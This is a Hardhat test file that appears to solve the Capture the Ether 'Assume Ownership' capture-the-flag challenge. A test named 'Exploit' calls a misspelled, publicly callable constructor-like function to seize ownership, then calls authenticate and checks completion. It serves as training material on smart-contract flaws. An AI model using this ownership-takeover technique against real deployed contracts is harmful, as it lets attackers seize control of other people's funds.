const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("AssumeOwnershipChallenge", async function () {
  let contract;

  before(async function () {
    contract = await (await ethers.getContractFactory("AssumeOwnershipChallenge")).deploy();
  });

  it("Exploit", async function () {
    await contract.AssumeOwmershipChallenge();
    await contract.authenticate();
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
